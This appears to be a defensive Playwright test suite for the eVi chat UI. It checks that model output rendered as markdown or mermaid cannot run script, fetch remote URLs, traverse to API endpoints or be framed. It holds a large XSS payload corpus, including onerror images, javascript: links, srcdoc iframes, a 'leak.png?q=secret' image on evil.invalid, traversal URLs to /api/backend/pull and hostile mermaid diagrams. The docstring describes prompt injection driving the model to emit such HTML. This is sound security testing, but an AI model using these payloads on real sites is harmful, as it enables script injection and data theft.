"""E2E: model output renders inert, and the UI needs no network but eVi's own
(fix-ui-render-and-desktop-ipc).

Prompt injection reaches the UI through the model: a fetched page, a repo file,
an MCP result or another session's message can make it emit HTML. Before the
fix `renderMarkdownInto` put marked's output into innerHTML as-is, so
`<img src=x onerror=…>` ran on the eVi origin — where it could POST /api/config
or start a turn that runs commands. Here a stubbed payload corpus goes through
every path that renders markdown (a streamed reply, a SystemMessage, a history
rebuild, a cross-session inbox note), in a real Chromium against the real
server, and we assert: no dialog, no flag set by a payload, nothing dangerous
left in the DOM, no request to a payload's URL, and no console error.

The libraries are vendored now, so a separate test blocks every request that
isn't to the eVi server (cdn.jsdelivr.net included) and checks that markdown,
highlighting and mermaid still render. A mermaid diagram is model output too:
its tests check that no diagram makes the page fetch anything. The CSP is
checked as the backstop: HTML injected around the sanitizer still can't run
script.
"""

from __future__ import annotations

import http.server
import json
import re
import threading

import pytest
from playwright.sync_api import Page, expect

pytestmark = pytest.mark.e2e

EVIL = "evil.invalid"          # a host no request may ever reach
PROBE = "/xss-probe-"          # a same-origin path no request may ever reach

# Each payload, if it ran, would set window.__xss (and most would also alert).
PAYLOADS = [
    '<img src=x onerror="window.__xss=1;alert(1)">',
    "<script>window.__xss=2;alert(2)</script>",
    "[click me](javascript:window.__xss=3)",
    '<a href="javascript:window.__xss=4">js link</a>',
    '<svg onload="window.__xss=5"><circle r="1"/></svg>',
    "<svg><script>window.__xss=6</script></svg>",
    '<iframe src="javascript:parent.__xss=7"></iframe>',
    '<iframe srcdoc="<script>parent.__xss=8</script>"></iframe>',
    '<object data="data:text/html,<script>parent.__xss=9</script>"></object>',
    '<embed src="data:text/html,<script>parent.__xss=10</script>">',
    '<details open ontoggle="window.__xss=11"><summary>s</summary>d</details>',
    '<input autofocus onfocus="window.__xss=13">',
    '<a href="data:text/html,<script>alert(14)</script>">data link</a>',
    '<form action="/api/config" method="post"><button>Save settings</button></form>',
    f'<meta http-equiv="refresh" content="0;url=https://{EVIL}/meta">',
    f'<base href="https://{EVIL}/">',
    f'<link rel="stylesheet" href="https://{EVIL}/x.css">',
    "<style>body{display:none}</style>",
    f"![leak](https://{EVIL}/leak.png?q=secret)",
    f'<img src="{PROBE}img">',
    f"[relative]({PROBE}link) [api](/api/config)",
    f'<img srcset="https://{EVIL}/a.png 1x">',
    f'<video src="https://{EVIL}/v.mp4" autoplay></video>',
    f'<p style="background:url(https://{EVIL}/bg.png)">styled</p>',
    '<div id="input">clobber</div><div class="perm-overlay shown">fake prompt</div>',
    # eVi's /images/ prefix, escaped by what the browser resolves: each would
    # load (or link to) some other path on eVi. A GET there can act.
    f"![dd](/images/..{PROBE}dd)",
    f"![pct](/images/%2e%2e{PROBE}pct)",
    f"![bs](/images/..\\{PROBE[1:]}bs)",
    f'<img src="/images/..{PROBE}raw">',
    f"[dd link](/images/..{PROBE}link) [abs link](http:{PROBE}abs)",
    # Points at the UI's own Reset button: a click on the reply would press it.
    '<label for="reset">**Show the full answer**</label>',
    # Last: the unclosed <style> swallows whatever follows it.
    '<math><mtext><table><mglyph><style><img src=x onerror="window.__xss=12">',
]
CORPUS = "\n\n".join(PAYLOADS)

# Nothing a payload contributes may survive in rendered markdown.
_DANGEROUS = (
    "script, iframe, object, embed, svg, math, form, button, style, meta, base, link,"
    " video, audio, source, img, [id], [name], [style], [srcset], [for], [form],"
    " a[href^='javascript' i], a[href^='data' i], input:not([type=checkbox])"
)
# The only same-origin URL rendered markdown may carry: an eVi image by name.
_LOCAL_IMAGE = re.compile(r"/images/[A-Za-z0-9_-][A-Za-z0-9._-]*")


def _assert_links_leave_evi(page: Page, base: str) -> None:
    """Every link is mailto:, a #fragment, an eVi image by name, or http(s) to
    another origin — judged as the browser resolves it, not by its prefix."""
    hrefs = page.evaluate(
        "() => [...document.querySelectorAll('#log .md a[href]')].map(a => [a.getAttribute('href'), a.href])")
    for raw, resolved in hrefs:
        if re.match(r"(mailto:|#)", raw):
            continue
        if _LOCAL_IMAGE.fullmatch(raw):
            assert resolved == base + raw, (raw, resolved)
            continue
        assert re.match(r"https?:", raw, re.I) and not resolved.startswith(base + "/"), (raw, resolved)


class _Watch:
    """Dialogs, console errors and requests a page makes."""

    def __init__(self, page: Page) -> None:
        self.dialogs: list[str] = []
        self.errors: list[str] = []
        self.requests: list[str] = []
        page.on("dialog", lambda d: (self.dialogs.append(d.message), d.dismiss()))
        page.on("pageerror", lambda e: self.errors.append(str(e)))
        page.on("console", self._console)
        page.on("request", lambda r: self.requests.append(r.url))

    def _console(self, m) -> None:
        # As in test_ui_smoke: a transient resource failure isn't an app bug.
        # A CSP violation is reported as an error and is NOT filtered.
        if m.type == "error" and "Failed to load resource" not in m.text and "net::ERR" not in m.text:
            self.errors.append(m.text)

    def probes(self) -> list[str]:
        return [u for u in self.requests if EVIL in u or PROBE in u]


def _assert_inert(page: Page, watch: _Watch, base: str) -> None:
    page.wait_for_timeout(800)  # let any onerror/onload/refresh fire
    assert watch.dialogs == []
    assert page.evaluate("() => window.__xss") is None
    assert watch.probes() == []
    assert watch.errors == []
    assert page.evaluate("() => document.baseURI").startswith(base)
    found = page.evaluate(
        """(sel) => [...document.querySelectorAll('#log .md')].flatMap(md =>
               [...md.querySelectorAll(sel)].map(e => e.outerHTML.slice(0, 120)))""",
        _DANGEROUS,
    )
    assert found == []
    on_attrs = page.evaluate(
        """() => [...document.querySelectorAll('#log .md *')].flatMap(e =>
               [...e.attributes].filter(a => /^on/i.test(a.name)).map(a => e.tagName + ' ' + a.name))"""
    )
    assert on_attrs == []
    _assert_links_leave_evi(page, base)
    # The page wasn't clobbered or redressed.
    assert page.evaluate("() => document.getElementById('input').tagName") == "TEXTAREA"
    assert page.evaluate("() => document.querySelectorAll('#log .perm-overlay').length") == 0
    assert page.url.startswith(base)


def _sse(events: list[dict]) -> str:
    return "".join(f"data: {json.dumps(e)}\n\n" for e in events)


def test_streamed_reply_and_system_message_render_inert(page: Page, evi_base_url: str):
    watch = _Watch(page)
    page.route("**/api/chat", lambda route: route.fulfill(
        status=200, content_type="text/event-stream",
        body=_sse([
            {"kind": "TextDelta", "text": "Here you go:\n\n"},
            {"kind": "TextDelta", "text": CORPUS},
            {"kind": "SystemMessage", "text": CORPUS},
            {"kind": "Done"},
        ]),
    ))
    page.goto(evi_base_url)
    page.fill("#input", "render the corpus")
    page.click("#send")
    assistant = page.locator(".msg.assistant").last
    expect(assistant).to_contain_text("Here you go", timeout=20_000)
    expect(page.locator(".msg.system").last).to_contain_text("data link", timeout=20_000)
    _assert_inert(page, watch, evi_base_url)
    # Text survives; the remote image became a link nothing fetched.
    expect(assistant).to_contain_text("js link")
    leak = assistant.locator(f"a[href^='https://{EVIL}/leak.png']")
    expect(leak).to_have_text("[image: leak]")
    expect(leak).to_have_attribute("target", "_blank")
    expect(leak).to_have_attribute("rel", "noopener noreferrer")


def test_history_rebuild_and_inbox_render_inert(page: Page, evi_base_url: str):
    watch = _Watch(page)
    page.route("**/api/session/*/history", lambda route: route.fulfill(json={"messages": [
        {"role": "user", "index": 1, "content": "<img src=x onerror=window.__xss=20>"},
        {"role": "assistant", "index": 2, "content": CORPUS},
    ]}))
    polls = {"n": 0}

    def channel(route):
        # The first poll seeds the cursor; later ones carry the note.
        polls["n"] += 1
        msgs = [] if polls["n"] == 1 else [{
            "source": 'session:<img src=x onerror="window.__xss=21">', "text": CORPUS}]
        route.fulfill(json={"messages": msgs})

    page.route("**/api/session/*/channel", channel)
    page.goto(evi_base_url)
    page.evaluate("() => rebuildHistory()")
    expect(page.locator(".msg.assistant").last).to_contain_text("js link", timeout=20_000)
    # The user turn is plain text, as typed.
    expect(page.locator(".msg.user").first).to_contain_text("<img src=x onerror=")
    expect(page.locator(".msg.system", has_text="Message from")).to_have_count(1, timeout=20_000)
    _assert_inert(page, watch, evi_base_url)


def test_markdown_keeps_what_chat_needs(page: Page, evi_base_url: str):
    # The sanitizer must not cost legitimate output: tables, details/summary,
    # task lists, code (highlighted), inline images, eVi's own /images/, links.
    watch = _Watch(page)
    page.goto(evi_base_url)
    md = (
        "# Title\n\n| a | b |\n|---|---|\n| 1 | **2** |\n\n"
        "<details><summary>More</summary>hidden <kbd>Ctrl</kbd> H<sub>2</sub>O</details>\n\n"
        "- [x] done\n- [ ] todo\n\n"
        "```python\ndef f(x):\n    return x  # c\n```\n\n"
        "> quote ~~struck~~\n\n"
        "![dot](data:image/gif;base64,R0lGODlhAQABAAAAACw=) "
        "![gen](/images/does-not-exist.png) "
        "[docs](https://example.com/docs) [mail](mailto:a@example.com) [top](#top)\n"
    )
    page.evaluate("(src) => renderMarkdownInto(addBubble('assistant'), src)", md)
    b = page.locator(".msg.assistant").last
    expect(b.locator(".md table td strong")).to_have_text("2")
    expect(b.locator(".md details summary")).to_have_text("More")
    expect(b.locator(".md kbd")).to_have_text("Ctrl")
    expect(b.locator(".md input[type=checkbox]")).to_have_count(2)
    assert b.locator(".md input[type=checkbox]").first.is_disabled()
    expect(b.locator(".md pre code.language-python .hljs-keyword").first).to_have_text("def")
    expect(b.locator(".md del")).to_have_text("struck")
    expect(b.locator(".md img[src^='data:image/gif']")).to_have_count(1)
    expect(b.locator(".md img[src='/images/does-not-exist.png']")).to_have_count(1)
    docs = b.locator(".md a[href='https://example.com/docs']")
    expect(docs).to_have_attribute("target", "_blank")
    expect(b.locator(".md a[href='mailto:a@example.com']")).to_have_count(1)
    expect(b.locator(".md a[href='#top']")).to_have_count(1)
    assert watch.dialogs == [] and watch.errors == []


def test_images_and_links_cannot_reach_evis_own_endpoints(page: Page, evi_base_url: str):
    # The /images/ allowlist used to judge the raw prefix, so `/images/../api/…`
    # loaded with no click — and GET /api/backend/pull starts a model download.
    # An absolute (or `http:/…`) URL back to eVi is a link into its API too, and
    # <label for="reset"> made one click on a reply press the UI's Reset.
    hits: list[str] = []

    def record(route):
        hits.append(f"{route.request.method} {route.request.url}")
        route.fulfill(status=204)

    page.route(re.compile(r".*/api/(backend/pull|reset)\b.*"), record)
    watch = _Watch(page)
    page.goto(evi_base_url)
    pull = "api/backend/pull?model=xss-probe-model"
    md = "\n\n".join([
        f"![a](/images/../{pull})",
        f"![b](/images/%2e%2e/{pull})",
        f"![c](/images/..\\{pull})",
        f'<img src="/images/../{pull}">',
        f"![d]({evi_base_url}/{pull})",
        f"[e]({evi_base_url}/{pull}) [f](http:/{pull}) [g](/images/../{pull})",
        '<label for="reset">**Show the full answer**</label>',
        "![gen](/images/20260101_42_0.png) [img link](/images/20260101_42_0.png)",
    ])
    page.evaluate("(src) => renderMarkdownInto(addBubble('assistant'), src)", md)
    b = page.locator(".msg.assistant").last
    # An eVi image by name still renders, as an image and as a link.
    expect(b.locator(".md img")).to_have_count(1)
    expect(b.locator(".md img")).to_have_attribute("src", "/images/20260101_42_0.png")
    expect(b.locator(".md a[href='/images/20260101_42_0.png']")).to_have_count(1)
    expect(b.locator(".md label")).to_have_count(1)
    b.locator(".md label").click()
    page.wait_for_timeout(800)
    assert hits == []
    assert b.locator(".md [for]").count() == 0
    assert b.locator(".md a[href*='/api/']").count() == 0
    _assert_links_leave_evi(page, evi_base_url)
    assert watch.dialogs == [] and watch.errors == []


def test_a_streamed_reply_renders_in_a_few_passes_and_keeps_its_notes(
        page: Page, evi_base_url: str):
    # marked + DOMPurify over the whole source on every delta made a long reply
    # freeze the page. Deltas now coalesce into a render at most every ~50 ms;
    # any other event flushes first, so the ToolCall note isn't wiped by a
    # render that lands after it.
    n = 300
    events = [{"kind": "TextDelta", "text": f"word{i} "} for i in range(n)]
    events += [{"kind": "ToolCall", "name": "noop_tool", "arguments": "{}"}, {"kind": "Done"}]
    page.route("**/api/chat", lambda route: route.fulfill(
        status=200, content_type="text/event-stream", body=_sse(events)))
    page.goto(evi_base_url)
    page.evaluate("""() => {
        window.__renders = 0;
        const render = window.renderMarkdownInto;
        window.renderMarkdownInto = function (bubble, src) {
            if (bubble.classList.contains('assistant')) window.__renders += 1;
            return render.apply(this, arguments);
        };
    }""")
    page.fill("#input", "stream a long one")
    page.click("#send")
    assistant = page.locator(".msg.assistant").last
    expect(assistant).to_contain_text(f"word{n - 1}", timeout=20_000)
    expect(assistant).to_contain_text("→ noop_tool({})")
    page.wait_for_timeout(300)  # a render still pending would land by now
    expect(assistant).to_contain_text("→ noop_tool({})")
    assert assistant.get_attribute("data-source") == "".join(f"word{i} " for i in range(n))
    renders = page.evaluate("() => window.__renders")
    assert 1 <= renders <= 20, renders


def test_ui_renders_with_only_the_evi_server_reachable(page: Page, evi_base_url: str):
    # Offline: every request that isn't to the eVi server fails, the CDN the
    # page used to import from included. Nothing may even be attempted.
    attempted: list[str] = []

    def gate(route):
        if route.request.url.startswith(evi_base_url):
            route.continue_()
        else:
            attempted.append(route.request.url)
            route.abort()

    page.route("**/*", gate)
    page.route(re.compile(r"https?://cdn\.jsdelivr\.net/.*"), lambda r: (attempted.append(r.request.url), r.abort()))
    watch = _Watch(page)
    page.route("**/api/chat", lambda route: route.fulfill(
        status=200, content_type="text/event-stream",
        body=_sse([
            {"kind": "TextDelta", "text": "```js\nconst x = 1;\n```\n\n"},
            {"kind": "TextDelta", "text": "```mermaid\ngraph TD\n  A[Start] --> B[End]\n```\n"},
            {"kind": "Done"},
        ]),
    ))
    page.goto(evi_base_url)
    page.wait_for_function("() => window.DOMPurify && window.marked && window.hljs")
    assert page.evaluate("() => hljs.listLanguages().length") > 150  # the full set, as before
    # Mermaid (3.5 MB) isn't loaded until a reply has a diagram.
    mermaid_js = "/static/vendor/mermaid/mermaid.min.js"
    assert not any(mermaid_js in u for u in watch.requests)
    page.fill("#input", "draw it")
    page.click("#send")
    assistant = page.locator(".msg.assistant").last
    expect(assistant.locator(".md pre code .hljs-keyword").first).to_have_text("const", timeout=20_000)
    svg = assistant.locator("svg")
    expect(svg).to_have_count(1, timeout=20_000)
    expect(svg).to_contain_text("Start")
    expect(svg).to_contain_text("End")
    # Loaded once, into its own frame: the page itself never runs it.
    assert [u for u in watch.requests if mermaid_js in u] == [evi_base_url + mermaid_js]
    assert page.evaluate("() => typeof window.mermaid") == "undefined"
    assert attempted == []
    assert watch.errors == [] and watch.dialogs == []


def test_mermaid_labels_cannot_load_or_run_anything(page: Page, evi_base_url: str):
    # Mermaid's 'strict' mode keeps <img src> in a label and puts it in the page
    # to measure it: the label sanitizer now drops it, so no request goes out.
    watch = _Watch(page)
    diagram = (
        "```mermaid\ngraph TD\n"
        f'  A["<img src={PROBE}mmd onerror=window.__xss=30> label"] --> B["<b>bold</b>"]\n'
        f'  B --> C["<a href=javascript:window.__xss=31>x</a><img src=https://{EVIL}/m.png>"]\n'
        "```\n"
    )
    page.route("**/api/chat", lambda route: route.fulfill(
        status=200, content_type="text/event-stream",
        body=_sse([{"kind": "TextDelta", "text": diagram}, {"kind": "Done"}]),
    ))
    page.goto(evi_base_url)
    page.fill("#input", "diagram")
    page.click("#send")
    svg = page.locator(".msg.assistant").last.locator("svg")
    expect(svg).to_have_count(1, timeout=20_000)
    expect(svg).to_contain_text("label")
    page.wait_for_timeout(800)
    assert watch.dialogs == [] and watch.probes() == [] and watch.errors == []
    assert page.evaluate("() => window.__xss") is None
    assert svg.locator("img, image, a, script, [onerror], [onclick]").count() == 0


# Diagrams that made the page fetch a URL of the diagram's choosing as soon as
# the reply finished — no click — when mermaid laid them out in the page itself.
# GET /api/backend/pull starts a model download. They get there by different
# routes: an image shape (mermaid measures it with `new Image()`), the same
# with its key spelled as a YAML escape, CSS from an init directive or front
# matter, a classDef, a C4 colour and a block style.
_PULL = "/api/backend/pull?model=xss-probe-mmd"
HOSTILE_DIAGRAMS = [
    f'flowchart TD\n  A@{{ img: "{_PULL}-img", label: "pic", w: 60, h: 60 }}\n  A --> B[end]',
    f'flowchart TD\n  A@{{ "\\x69mg": "{PROBE}mmd-img-esc", label: "pic" }}\n  A --> B[end]',
    f'%%{{init: {{"fontFamily": "x; background-image: url({_PULL}-font)"}}}}%%\n'
    "graph TD\n  F1[font one] --> F2[font two]",
    f'---\nconfig:\n  themeCSS: "span {{ background-image: url({PROBE}mmd-fm); }}"\n---\n'
    "graph TD\n  M1[fm one] --> M2[fm two]",
    f"stateDiagram-v2\n  [*] --> S\n  classDef c background-image:url({PROBE}mmd-state)\n  class S c",
    f'C4Context\n  Person(a, "Alice")\n  UpdateElementStyle(a, $bgColor="url({PROBE}mmd-c4#x)")',
    f"block-beta\n  a b\n  style a background-image:url({PROBE}mmd-block)",
]

# Finds any url() in a shown diagram that isn't a same-document #ref.
_FOREIGN_URLS = """(root) => {
    const bad = /url\\((?!\\s*['"]?#)/i;
    const found = [];
    for (const el of root.querySelectorAll('svg, svg *')) {
        if (el.tagName.toLowerCase() === 'style' && bad.test(el.textContent)) found.push('style');
        for (const a of el.attributes) if (bad.test(a.value)) found.push(el.tagName + ' ' + a.name);
    }
    return found;
}"""


def _record_fetches(page: Page) -> list[str]:
    """Answer (and list) every request for /api/backend/pull or a probe path
    that actually leaves the page — one its CSP refused never gets here."""
    hits: list[str] = []

    def record(route):
        hits.append(f"{route.request.method} {route.request.url}")
        route.fulfill(status=204)

    page.route(re.compile(rf".*(/api/backend/pull|{PROBE}).*"), record)
    return hits


def test_diagrams_cannot_make_the_page_fetch_anything(page: Page, evi_base_url: str):
    # Mermaid now lays diagrams out in a frame whose CSP loads nothing, a
    # diagram that tried is not shown, a diagram's config can't set CSS, and
    # what joins the page is vetted again. A plain diagram still renders.
    hits = _record_fetches(page)
    watch = _Watch(page)
    reply = "".join(f"```mermaid\n{d}\n```\n\n" for d in [*HOSTILE_DIAGRAMS, "graph TD\n  Fine --> Done"])
    page.route("**/api/chat", lambda route: route.fulfill(
        status=200, content_type="text/event-stream",
        body=_sse([{"kind": "TextDelta", "text": reply}, {"kind": "Done"}]),
    ))
    page.goto(evi_base_url)
    page.fill("#input", "diagrams")
    page.click("#send")
    assistant = page.locator(".msg.assistant").last
    # Diagrams render in order, so the plain one last means all were handled.
    expect(assistant.locator("svg", has_text="Fine")).to_have_count(1, timeout=30_000)
    page.wait_for_timeout(800)
    assert hits == []
    assert watch.dialogs == [] and page.evaluate("() => window.__xss") is None
    # The only errors: the frame's CSP refusing what a diagram asked for.
    assert all('"img-src data:"' in e for e in watch.errors), watch.errors
    # The two whose only trick was config a diagram may not set draw plainly;
    # the five that named a resource aren't shown (their source stays visible).
    shown = assistant.evaluate(
        "a => [...a.children].filter(c => c.firstElementChild"
        " && c.firstElementChild.tagName.toLowerCase() === 'svg').map(c => c.textContent)")
    assert len(shown) == 3, shown
    assert "font one" in shown[0] and "fm one" in shown[1] and "Fine" in shown[2], shown
    assert assistant.evaluate(_FOREIGN_URLS) == []
    expect(assistant.locator(".md pre code").first).to_contain_text("img:")


# A diagram as it would come back from mermaid with everything that could load
# or restyle still in it — what the frame is there to stop, planted directly.
_PLANTED_SVG = f"""<svg id="mmd-abc123" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 100" width="200">
<style>
@import url({PROBE}d-import);
@font-face {{ font-family: x; src: url({PROBE}d-fontface); }}
#mmd-abc123 {{ fill: #ccc; }}
#mmd-abc123 .node rect {{ fill: #333; stroke: url(#grad); }}
#mmd-abc123 .a {{ background-image: url({PROBE}d-bg); color: red; }}
#mmd-abc123 .b {{ mask-image: u\\72l({PROBE}d-escaped); }}
#mmd-abc123 .c {{ cursor: url({PROBE}d-cursor), auto; }}
#mmd-abc123 .d {{ background-image: image-set("{PROBE}d-imageset" 1x); }}
#mmd-abc123, body {{ display: none !important; }}
#mmd-abc1234 .e {{ color: blue; }}
@media screen {{ #mmd-abc123 .h {{ background: url({PROBE}d-media); }} body {{ visibility: hidden; }} }}
</style>
<defs><linearGradient id="grad"><stop offset="0" stop-color="red"/></linearGradient>
<filter id="f"><feImage href="{PROBE}d-feimage"/></filter></defs>
<g class="node a"><rect width="50" height="20" fill="url({PROBE}d-fill#p)" marker-end="url(#grad)"/></g>
<rect class="b c d" width="10" height="10" style="fill: red; cursor: url({PROBE}d-style), auto"/>
<foreignObject width="100" height="40"><div xmlns="http://www.w3.org/1999/xhtml"
  style="background:url({PROBE}d-fo)"><span class="a">label</span></div></foreignObject>
</svg>"""


def test_what_a_diagram_brings_into_the_page_is_vetted_again(page: Page, evi_base_url: str):
    # The second layer, on its own: should something reach the page from the
    # frame without having tried to load there (a cursor loads on hover), the
    # SVG still can't fetch or restyle the UI. sanitizeDiagram refuses it;
    # stripDiagramLoads keeps only #refs and rules scoped to the diagram.
    hits = _record_fetches(page)
    page.goto(evi_base_url)
    page.wait_for_function("() => window.DOMPurify && window.marked && window.hljs")
    out = page.evaluate("""(svg) => {
        const refused = sanitizeDiagram(svg, 'mmd-abc123') === null;
        const frag = DOMPurify.sanitize(svg, { USE_PROFILES: { svg: true, svgFilters: true, html: true },
            ADD_TAGS: ['foreignObject'], HTML_INTEGRATION_POINTS: { foreignobject: true },
            RETURN_DOM_FRAGMENT: true });
        const removed = stripDiagramLoads(frag, 'mmd-abc123');
        const box = document.createElement('div');
        box.id = 'planted';
        box.appendChild(frag);
        addBubble('assistant').appendChild(box);
        return { refused, removed, css: box.querySelector('style').textContent,
                 marker: box.querySelector('[marker-end]').getAttribute('marker-end') };
    }""", _PLANTED_SVG)
    page.hover("#planted rect.c", force=True)
    page.wait_for_timeout(800)
    assert hits == []
    assert out["refused"] is True
    assert out["removed"] >= 12, out
    assert page.locator("#planted").evaluate(_FOREIGN_URLS) == []
    assert page.locator("#planted feImage[href], #planted [style*='url']").count() == 0
    # Mermaid's own kind of styling survives; nothing else does.
    css = out["css"]
    assert "#mmd-abc123 .node rect" in css and 'url("#grad")' in css
    assert out["marker"] == "url(#grad)"
    for gone in ("@import", "@font-face", "body", "display: none", "mmd-abc1234", "\\"):
        assert gone not in css, gone
    assert page.evaluate("() => getComputedStyle(document.body).display") == "flex"
    assert page.evaluate("() => getComputedStyle(document.body).visibility") == "visible"


def test_csp_stops_script_that_bypasses_the_sanitizer(page: Page, evi_base_url: str):
    # The backstop: markup put straight into the DOM, around DOMPurify, still
    # can't run — the page's CSP allows only its own scripts.
    page.goto(evi_base_url)
    page.evaluate("""() => {
        window.__violations = [];
        document.addEventListener('securitypolicyviolation',
            e => window.__violations.push(e.violatedDirective));
        const d = document.createElement('div');
        d.innerHTML = '<img src="data:," onerror="window.__xss=40">';
        document.body.appendChild(d);
        const s = document.createElement('script');
        s.textContent = 'window.__xss = 41';
        document.body.appendChild(s);
        const i = new Image();
        i.src = 'https://evil.invalid/csp.png';
        document.body.appendChild(i);
    }""")
    page.wait_for_timeout(800)
    assert page.evaluate("() => window.__xss") is None
    violations = page.evaluate("() => window.__violations")
    assert {"script-src-attr", "script-src-elem", "img-src"} <= set(violations), violations


def test_the_ui_runs_under_its_csp_header(page: Page, evi_base_url: str):
    # The page's policy goes out as a header too (with frame-ancestors, which
    # a <meta> can't carry), built from the page's own <meta>. Under it —
    # script-src 'self', no hash — the app, a file, runs and chats, with no
    # violation logged.
    watch = _Watch(page)
    responses = {}
    page.on("response", lambda r: responses.setdefault(r.url, r))
    page.goto(evi_base_url)
    expect(page.locator("#input")).to_be_visible()
    headers = responses[evi_base_url + "/"].headers
    meta = page.locator('meta[http-equiv="Content-Security-Policy"]').get_attribute("content")
    assert "'sha" not in meta
    assert headers["content-security-policy"] == meta + "; frame-ancestors 'none'"
    assert headers["x-frame-options"] == "DENY"
    assert headers["x-content-type-options"] == "nosniff"
    app = responses[evi_base_url + "/static/app.js"]
    assert app.status == 200 and app.headers["content-type"].startswith("text/javascript")
    assert app.headers["x-content-type-options"] == "nosniff"
    assert page.evaluate(
        "() => [typeof DOMPurify, typeof marked, typeof hljs, typeof window.eviUI]"
    ) == ["function", "object", "object", "object"]
    page.fill("#input", "hello under the header")
    page.click("#send")
    expect(page.locator("#log .msg.assistant").last).to_contain_text("fake backend", timeout=20_000)
    assert watch.errors == []


class _Framer:
    """Another site that frames eVi: a real server on another loopback origin
    (a local page or another app's dev server). Chromium already refuses a
    public site's frame of a loopback address, and a route-fulfilled page
    counts as public, so it has to be a real socket."""

    def __init__(self, target: str) -> None:
        body = f'<iframe src="{target}" width="900" height="700"></iframe>'.encode()

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):  # noqa: N802
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *_args):
                pass

        self.srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        self.url = f"http://localhost:{self.srv.server_port}/"

    def __enter__(self) -> _Framer:
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()
        return self

    def __exit__(self, *_exc) -> None:
        self.srv.shutdown()
        self.srv.server_close()


def test_another_site_cannot_frame_the_ui(page: Page, evi_base_url: str):
    # Inside another site's frame, a click meant for that site could land on
    # Approve or Settings (clickjacking). The page's headers (frame-ancestors
    # 'none', X-Frame-Options: DENY) make the browser refuse to show it there:
    # the frame never gets eVi's document, so the app never even loads.
    evi: list[str] = []
    page.on("request", lambda r: evi.append(r.url) if r.url.startswith(evi_base_url) else None)
    console: list[str] = []
    page.on("console", lambda m: console.append(m.text))
    with _Framer(evi_base_url + "/") as framer:
        with page.expect_response(evi_base_url + "/") as resp:
            page.goto(framer.url)
        headers = resp.value.headers
        assert headers["content-security-policy"].endswith("; frame-ancestors 'none'")
        assert headers["x-frame-options"] == "DENY"
        page.wait_for_timeout(800)  # the app would have booted and called /api by now
        assert evi == [evi_base_url + "/"], evi  # not app.js, not a library, no /api
        [frame] = [f for f in page.frames if f != page.main_frame]
        assert not frame.url.startswith(evi_base_url), frame.url
        assert frame.evaluate("() => document.getElementById('reset')") is None
        assert any("frame-ancestors" in m for m in console), console


def test_a_framed_ui_without_its_headers_stays_blank_and_inert(page: Page, evi_base_url: str):
    # The fallback for a copy served without the headers (an older server, a
    # proxy that drops them): the app refuses to run inside any frame and
    # blanks the page before it calls anything.
    def without_framing_headers(route):
        resp = route.fetch()
        headers = {k: v for k, v in resp.headers.items()
                   if k.lower() not in ("content-security-policy", "x-frame-options")}
        route.fulfill(response=resp, headers=headers)

    page.route(evi_base_url + "/", without_framing_headers)
    api: list[str] = []
    page.on("request", lambda r: api.append(r.url) if "/api/" in r.url else None)
    with _Framer(evi_base_url + "/") as framer:
        page.goto(framer.url)  # load waits for the frame
        frame = next(f for f in page.frames if f.url.startswith(evi_base_url))
        frame.wait_for_load_state("load")
        page.wait_for_timeout(800)  # the app would have booted and called /api by now
        assert frame.evaluate("() => document.documentElement.childElementCount") == 0
        assert frame.evaluate("() => document.getElementById('reset')") is None
        assert api == []


def test_desktop_links_go_to_the_system_browser_through_one_listed_command(
        page: Page, evi_base_url: str):
    # Inside the desktop shell there is no window.__TAURI__ (withGlobalTauri is
    # off); the page reaches the shell through Tauri's IPC primitive. Emulate
    # it here and check a markdown link click becomes open_external_cmd, with
    # the window staying on eVi.
    page.add_init_script("""
        window.__calls = [];
        window.__TAURI_INTERNALS__ = { invoke: (cmd, args) => {
            window.__calls.push([cmd, args]); return Promise.resolve(null); } };
    """)
    popups: list[str] = []
    page.on("popup", lambda p: popups.append(p.url))
    page.goto(evi_base_url)
    assert page.evaluate("() => typeof window.__TAURI__") == "undefined"
    page.evaluate("() => renderMarkdownInto(addBubble('assistant'), '[docs](https://example.com/docs)')")
    page.locator(".msg.assistant .md a").last.click()
    page.wait_for_timeout(300)
    calls = page.evaluate("() => window.__calls.filter(c => c[0] === 'open_external_cmd')")
    assert calls == [["open_external_cmd", {"url": "https://example.com/docs"}]]
    assert popups == []
    assert page.url.startswith(evi_base_url)
